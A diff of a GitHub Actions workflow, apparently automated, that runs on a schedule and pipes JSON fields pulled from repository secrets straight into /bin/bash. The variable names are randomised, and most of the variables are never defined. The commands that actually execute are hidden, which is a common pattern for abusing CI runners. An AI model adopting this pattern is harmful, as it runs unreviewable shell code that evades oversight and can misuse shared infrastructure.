@@ -1,28 +1,23 @@
 name: massageconsulting
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 2/6 * * *'
+    - cron: '2 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: massageconsulting
         env:
-          hrbbr943: ${{ secrets.hrbbr943 }}
+          ftlx0264: ${{ secrets.ftlx0264 }}
         run: |
-          echo $hrbbr943 | jq -r .fgon18408 | /bin/bash
-          echo $kmtvr58468 | jq -r .ore7935 | /bin/bash
-          echo $jtuk569 | jq -r .xj70 | /bin/bash
-          echo $v065 | jq -r .l8488 | /bin/bash
-          echo $w13087 | jq -r .rksob3617 | /bin/bash
-          echo $clzc00 | jq -r .uku28 | /bin/bash
-          echo $yc179 | jq -r .rktu33 | /bin/bash
-          echo $tjyfm51424 | jq -r .bdij1724 | /bin/bash
-          echo $bzojq3 | jq -r .ll687 | /bin/bash
-          echo $n564 | jq -r .nmdt3149 | /bin/bash
+          echo $ftlx0264 | jq -r .o98 | /bin/bash
+          echo $vudoi0264 | jq -r .ibzdu2 | /bin/bash
+          echo $mxcwv33891 | jq -r .sqw1354 | /bin/bash
+          echo $fsg876 | jq -r .ox8448 | /bin/bash
+          echo $n063 | jq -r .wr19953 | /bin/bash
+          echo $ehagt0 | jq -r .bj08345 | /bin/bash
+          echo $jpxz90 | jq -r .hmhi48 | /bin/bash
 
